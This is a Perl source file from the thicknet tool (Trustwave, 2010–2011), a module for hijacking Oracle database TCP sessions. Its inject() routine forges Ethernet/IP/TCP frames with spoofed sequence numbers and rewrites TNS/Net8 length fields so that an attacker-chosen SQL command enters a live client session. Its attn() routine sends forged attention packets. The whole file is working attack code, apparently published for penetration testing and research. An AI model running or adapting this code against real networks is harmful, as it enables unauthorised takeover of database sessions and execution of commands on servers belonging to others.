package thicknet::session::Oracle;

=header
    thicknet - A tool to manipulate and take control of TCP sessions
	Created by Steve Ocepek and Wendel G. Henrique
	Copyright (C) 2010, 2011 Trustwave Holdings, Inc.
 
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
 
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
=cut

use base thicknet::session::Session;

use Exporter;
use Net::Pcap;
use NetPacket::Ethernet qw(:strip);
use NetPacket::TCP;
use NetPacket::IP;
use Data::HexDump;
use thicknet::Util;
use thicknet::pcap::ARP;

sub downgrade {
	my ($self,$text) = @_;
	return "Downgrade not supported";
}

sub attn {
    my ($self,$attn) = ($_[0],$_[1]);
	
	# Get copy of sled
    my $ip_obj = NetPacket::IP->decode(eth_strip($self->{sled}->{pkt}));
    my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	$tcp_obj->{seqnum} = $self->{client_seq};
	$tcp_obj->{acknum} = $self->{server_seq};
	
	# Query for error code using attn number
	$tcp_obj->{data} = pack('C*', 0x00, 0x0b, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x01, 0x00, $attn);
	
	# Encode for transmission	
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($self->{server}), $self->{mymac}, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($self->{pcaph}, $pkt);
	
	# Increment client (our) sequence number
	$self->{client_seq} += length($tcp_obj->{data});
}

sub inject {
    my ($self,$cmd) = ($_[0],$_[1]);
    
    # Start blocking packets
    $self->{block} = 1;
    
    # Get copy of sled
    my $ip_obj = NetPacket::IP->decode(eth_strip($self->{sled}->{pkt}));
    my $tcp_obj = NetPacket::TCP->decode($ip_obj->{data});
	
	# Get data
	my $data = $tcp_obj->{data};
	
	# Pack cmd length
	my $cmdlen = pack ('C*', length($cmd));
	
	# Replace Net8 len before sled_text
	# Capture length for use with other length field
	$data =~ s/(.{1})($sled_text)/$cmdlen$2/i;
	my $orig_len = $1;
	
	# OK this keeps shifting around on me, need to look for length field
	# after 035e... skip 10 and hope we don't catch the wrong thing
	$data =~ s/(\x03\x5e.{10,})$orig_len/$1$cmdlen/;
	
	# Change command to supplied value
	# This regex grabs everything from sled_text and beyond until
	# hitting a control char (0x01)
	$data =~ s/$sled_text.*?\x01/$cmd\x01/i;

	# Change TNS length
	my $off_tns_len = 1;
	substr($data, $off_tns_len, 1, pack('C', length($data)));
	
	# Change initial process number - experiment to fix fetch, not working
	# substr($data, 12, 1, pack('C', 0x17));
	
	# Ok now change sequence numbers to latest values, encode and send
	$tcp_obj->{seqnum} = $session->{client_seq};
	$tcp_obj->{acknum} = $session->{server_seq};
	$tcp_obj->{data} = $data;
	
	# Encode for transmission	
	$ip_obj->{data} = $tcp_obj->encode($ip_obj);
	my $ip_pkt = $ip_obj->encode;
	
	# Make the ethernet frame, destined for server
	my $pkt = pack('H12H12n', getmac($self->{server}), $self->{mymac}, 0x0800) . $ip_pkt;
	Net::Pcap::pcap_sendpacket($self->{pcaph}, $pkt);
	
	# Increment client (our) sequence number
    $self->{client_seq} += length($tcp_obj->{data});
}

1;